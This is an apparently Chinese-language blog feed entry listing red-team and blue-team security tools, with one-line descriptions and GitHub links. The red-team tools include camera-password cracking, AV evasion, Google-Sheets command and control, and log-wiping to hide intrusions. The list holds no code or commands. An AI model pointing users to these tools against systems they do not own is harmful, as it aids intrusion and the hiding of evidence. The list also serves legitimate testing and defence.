&lt;p&gt;Yasso 将作为一款内网辅助渗透工具集发布，它集合了许多实用功能，来帮助  &lt;code&gt;Red team&lt;/code&gt;  成员在内网极端环境下的工具使用以及  &lt;code&gt;Blue team&lt;/code&gt;  成员的内网自检，并且程序加入了代理功能以及  &lt;code&gt;ants&lt;/code&gt;  的扫描并发，在实现功能的同时追求准确和速度&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NhaXJzb24vWWFzc28=&#34;&gt;https://github.com/sairson/Yasso&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;本地端口扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#本地端口扫描&#34;&gt;#&lt;/a&gt; 本地端口扫描&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;多线程扫描本机使用的端口&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xlbmdqaWJvL1JlZFRlYW1Ub29scy90cmVlL21hc3Rlci93aW5kb3dzLyVFNiU5QyVBQyVFNSU5QyVCMCVFNyVBQiVBRiVFNSU4RiVBMyVFNiU4OSVBQiVFNiU4RiU4Rg==&#34;&gt;https://github.com/lengjibo/RedTeamTools/tree/master/windows/%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;camover一款功能强大的摄像头漏洞利用工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#camover一款功能强大的摄像头漏洞利用工具&#34;&gt;#&lt;/a&gt; CamOver：一款功能强大的摄像头漏洞利用工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;CamOver 是一款功能强大的摄像头漏洞利用工具，在该工具的帮助下，广大研究人员可以轻松破解掉你家网络摄像头的管理员密码，并接管你的摄像头。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0VudHlTZWMvQ2FtT3Zlcg==&#34;&gt;https://github.com/EntySec/CamOver&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;nishang&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nishang&#34;&gt;#&lt;/a&gt; Nishang&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Nishang 是一个框架以及脚本和有效负载的集合，它允许使用 PowerShell 进行进攻性安全，渗透测试和红色团队。Nishang 在渗透测试的所有阶段都很有用。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmc=&#34;&gt;https://github.com/samratashok/nishang&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;firebuster-firelistener&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#firebuster-firelistener&#34;&gt;#&lt;/a&gt; FireBuster FireListener&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;FireBuster 可以对内网进行扫描，它会把包发给 FireListener.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JvbzdicmVhay9Qb3dlclNoZWxsLVNjcmlwdHM=&#34;&gt;https://github.com/roo7break/PowerShell-Scripts&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;xy_cross-domain&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xy_cross-domain&#34;&gt;#&lt;/a&gt; XY_Cross-domain&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;一款内网横向渗透辅助工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2lzeGlhbmd5YW5nL1hZX0Nyb3NzLWRvbWFpbg==&#34;&gt;https://github.com/isxiangyang/XY_Cross-domain&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;aopo-内网自动化快速打点工具资产探测漏洞扫描服务扫描弱口令爆破&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#aopo-内网自动化快速打点工具资产探测漏洞扫描服务扫描弱口令爆破&#34;&gt;#&lt;/a&gt; Aopo - 内网自动化快速打点工具｜资产探测｜漏洞扫描｜服务扫描｜弱口令爆破&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;内网自动化快速打点工具｜资产探测｜漏洞扫描｜服务扫描｜弱口令爆破&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0V4cExhbmdjbi9Bb3Bv&#34;&gt;https://github.com/ExpLangcn/Aopo&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;netspy&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#netspy&#34;&gt;#&lt;/a&gt; netspy&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;netspy 是一款快速探测内网可达网段工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NobWlseWx0eS9uZXRzcHk=&#34;&gt;https://github.com/shmilylty/netspy&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;edrhunt&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#edrhunt&#34;&gt;#&lt;/a&gt; EDRHunt&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;由于 Windows 市场上提供了大量端点检测和响应系统 (EDR) 和防病毒解决方案，因此在红队操作期间，迫切需要在目标端点上对这些已安装的解决方案进行指纹识别。事实证明，这些信息对于定制自定义漏洞利用和攻击技术以成功渗透和对目标进行操作至关重要。EDRHunt 是一个实用程序，可通过查询服务、驱动程序、运行进程和注册表项来扫描和识别 Windows 端点上已安装的 EDR 和 AV。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0ZvdXJDb3JlTGFicy9FRFJIdW50&#34;&gt;https://github.com/FourCoreLabs/EDRHunt&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;viper&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#viper&#34;&gt;#&lt;/a&gt; Viper&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Viper (炫彩蛇) 是一款图形化内网渗透工具，将内网渗透过程中常用的战术及技术进行模块化及武器化，集成杀软绕过，内网隧道，文件管理，命令行等基础功能，当前已集成 70 + 个模块，覆盖初始访问 / 持久化 / 权限提升 / 防御绕过 / 凭证访问 / 信息收集 / 横向移动等大类，目标是帮助红队工程师提高攻击效率，简化操作，降低技术门槛，支持在浏览器中运行原生 msfconsole, 且支持多人协作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0Z1bm55V29sZi9WaXBlcg==&#34;&gt;https://github.com/FunnyWolf/Viper&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;蓝队工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#蓝队工具&#34;&gt;#&lt;/a&gt; 蓝队工具&lt;/h1&gt;
&lt;h2 id=&#34;web-log-parser-web日志工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-log-parser-web日志工具&#34;&gt;#&lt;/a&gt; web-log-parser - web 日志工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;web-log-parser&lt;/strong&gt; 为开源的分析 web 日志工具，采用 python 语言开发，具有灵活的日志格式配置。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0plZmZYdWUvd2ViLWxvZy1wYXJzZXI=&#34;&gt;https://github.com/JeffXue/web-log-parser&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;rkhunter&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rkhunter&#34;&gt;#&lt;/a&gt; RKHunter&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;RKHunter 是专业检测系统是否感染 rootkit 的工具，通过执行一系列脚本来确定服务器是否感染 rootkit。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5yb290a2l0Lm5sL3Byb2plY3RzL3Jvb3RraXRfaHVudGVyLmh0bWw=&#34;&gt;http://www.rootkit.nl/projects/rootkit_hunter.html&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;duckmemoryscan-内存马免杀马查杀工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#duckmemoryscan-内存马免杀马查杀工具&#34;&gt;#&lt;/a&gt; DuckMemoryScan - 内存马免杀马查杀工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;一个简单寻找包括不限于 iis 劫持，无文件木马，shellcode 免杀后门的工具，由 huoji 花了 1 天编写，编写时间 2021-02-24 !&lt;span class=&#34;spoiler&#34; title=&#34;你知道的太多了&#34;&gt; 本程序需要 64 位编译才能回溯 x64 的程序堆栈，请勿执行 32 位编译&lt;/span&gt;！!&lt;span class=&#34;spoiler&#34; title=&#34;你知道的太多了&#34;&gt; 本工具不能代替杀毒软件&lt;/span&gt;！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2h1b2ppMTIwL0R1Y2tNZW1vcnlTY2Fu&#34;&gt;https://github.com/huoji120/DuckMemoryScan&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;pchunter&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pchunter&#34;&gt;#&lt;/a&gt; PCHunter&lt;/h2&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;PCHunter是一款知名的Windows系统底层反内核工具，系统信息检测工具、手工杀毒工具、系统安全辅助工具。这款ARK工具有内核级驱动检测、内核对象劫持、Hook 、MBR Rootkit、文件管理、进程管理、启动项管理、注册表管理、服务管理、驱动模块、网络管理、系统内核查看、应用层钩子、系统修复等功能。
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy54dWV0ci5jb20v&#34;&gt;http://www.xuetr.com/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;openvas-漏洞评估系统&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#openvas-漏洞评估系统&#34;&gt;#&lt;/a&gt; OpenVAS - 漏洞评估系统&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;OpenVAS 是开放式漏洞评估系统，也可以说它是一个包含着相关工具的网络扫描器。其核心部件是一个服务器，包括一套网络漏洞测试程序，可以检测远程系统和应用程序中的安全问题。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3BlbnZhcy5vcmcv&#34;&gt;https://www.openvas.org/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;pestudio&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pestudio&#34;&gt;#&lt;/a&gt; PeStudio&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;PeStudio 是一款独特的工具，执行静态校验 32 位和 64-bit 为的可执行文件。PEStudio 针对个人非商业用途是免费的。恶意可执行程序通常隐藏其恶意行为，避免被查出。因此，恶意程序通常呈现存在异常并且可疑的状态。PEStudio 的目标就是检测这些异常，评估被分析的可执行文件的可信度。由于这些被分析的可执行文件并没有执行，你可以无风险的检测未知以及恶意的可执行文件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cud2luaXRvci5jb20v&#34;&gt;https://www.winitor.com/&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h1&gt;
&lt;h2 id=&#34;savior&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#savior&#34;&gt;#&lt;/a&gt; Savior&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;渗透测试报告自动生成工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL011c3RhcmQ0MDQvU2F2aW9y&#34;&gt;https://github.com/Mustard404/Savior&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;moonwalk-linux系统日志清除工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#moonwalk-linux系统日志清除工具&#34;&gt;#&lt;/a&gt; Moonwalk - Linux 系统日志清除工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;moonwalk 是一个 400 KB 的单二进制可执行文件，可以在渗透测试 Unix 机器时清除您的痕迹。它保存系统日志开发前的状态，并恢复该状态，包括开发后的文件系统时间戳，在 shell 中留下零幽灵的痕迹。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL211ZmVlZHZoL21vb253YWxrLw==&#34;&gt;https://github.com/mufeedvh/moonwalk/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;渗透测试工具集合&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#渗透测试工具集合&#34;&gt;#&lt;/a&gt; 渗透测试工具集合&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;这是我多年来为渗透测试和 IT 安全审计目的而开发的&lt;strong&gt; 160 多种&lt;/strong&gt;工具，脚本，备忘单和其他战利品的集合。在我的现实世界中，它们中的大多数至少派上了用场一次。&lt;br /&gt;
该系列进一步分为以下几个部分：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;clouds&lt;/code&gt; - 我在云评估期间想到的工具&lt;/li&gt;
&lt;li&gt;&lt;code&gt;file-formats&lt;/code&gt; - 文件格式相关的实用程序，模糊器等。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;linux&lt;/code&gt; - 一小堆基于 Linux 的脚本和工具。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;networks&lt;/code&gt; - 网络设备和协议渗透测试工具&lt;/li&gt;
&lt;li&gt;&lt;code&gt;others&lt;/code&gt; - 其他与这种工艺有关&lt;/li&gt;
&lt;li&gt;&lt;code&gt;phishing&lt;/code&gt; - 用于提供网络钓鱼意识和红队模拟的脚本和工具&lt;/li&gt;
&lt;li&gt;&lt;code&gt;red-teaming&lt;/code&gt; - 我在紫色 / 红色团队活动期间一直在使用的许多工具&lt;/li&gt;
&lt;li&gt;&lt;code&gt;web&lt;/code&gt; - Web 应用程序安全评估相关实用程序。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;windows&lt;/code&gt; - Windows 好东西，脚本，漏洞利用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21nZWVreS9QZW5ldHJhdGlvbi1UZXN0aW5nLVRvb2xz&#34;&gt;https://github.com/mgeeky/Penetration-Testing-Tools&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;掩日-适用于红队的综合免杀工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#掩日-适用于红队的综合免杀工具&#34;&gt;#&lt;/a&gt; 掩日 - 适用于红队的综合免杀工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;掩日是一款适用于红队的综合免杀工具，其中包括有：通用免杀、本地分离、网络分离等多种免杀方式和杀软识别等功能，至于免杀效果还行自行测试。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzF5MG4vQVZfRXZhc2lvbl9Ub29s&#34;&gt;https://github.com/1y0n/AV_Evasion_Tool&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;cloud-bucket-leak-detection-tools&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cloud-bucket-leak-detection-tools&#34;&gt;#&lt;/a&gt; Cloud-Bucket-Leak-Detection-Tools&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;阿里云、腾讯云等泄露利用检测工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1V6SnUvQ2xvdWQtQnVja2V0LUxlYWstRGV0ZWN0aW9uLVRvb2xz&#34;&gt;https://github.com/UzJu/Cloud-Bucket-Leak-Detection-Tools&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;thundersearch-gui图形化渗透测试信息搜集工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#thundersearch-gui图形化渗透测试信息搜集工具&#34;&gt;#&lt;/a&gt; ThunderSearch - GUI 图形化渗透测试信息搜集工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;调用 ZoomEye 的官方 api，结合开发文档，开发的 GUI 界面的信息搜集工具。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3h6YWp5anMvVGh1bmRlclNlYXJjaA==&#34;&gt;https://github.com/xzajyjs/ThunderSearch&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;lynis&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lynis&#34;&gt;#&lt;/a&gt; Lynis&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Lynis&lt;/strong&gt; 是一款 Unix 系统的安全审计以及加固工具，能够进行深层次的安全扫描，其目的是检测潜在的时间并对未来的系统加固提供建议。这款软件会扫描一般系统信息，脆弱软件包以及潜在的错误配置。扫描完成后，Lynis 还会为我们生成一份包含所有扫描结果的安全报告。&lt;br /&gt;
Lynis 是 Unix/Linux 系统用于软件补丁管理，恶意软件扫描和漏洞检测的最值得信赖的自动化审计工具之一。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0NJU09meS9seW5pcw==&#34;&gt;https://github.com/CISOfy/lynis&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;gc2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gc2&#34;&gt;#&lt;/a&gt; GC2&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;GC2 是一款功能强大的命令控制应用工具，该工具将允许广大安全研究人员或渗透测试人员使用 Google Sheet 来在目标设备上执行远程控制命令，并使用 Google Drive 来提取目标设备中的敏感数据。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xvb0NpcHJpYW4vR0MyLXNoZWV0&#34;&gt;https://github.com/looCiprian/GC2-sheet&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;moonwalk&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#moonwalk&#34;&gt;#&lt;/a&gt; moonwalk&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;通过在系统日志和文件系统时间戳上留下零痕迹，在 Linux 漏洞利用 / 渗透测试期间覆盖您的踪迹。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL211ZmVlZHZoL21vb253YWxr&#34;&gt;https://github.com/mufeedvh/moonwalk&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;spacecore-集成化渗透测试工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spacecore-集成化渗透测试工具&#34;&gt;#&lt;/a&gt; SpaceCore - 集成化渗透测试工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;一个简单的集成化渗透测试工具，该工具在于帮助您更好的完成渗透测试&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0Vyb3Npb24yMDIwL1NwYWNlQ29yZQ==&#34;&gt;https://github.com/Erosion2020/SpaceCore&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
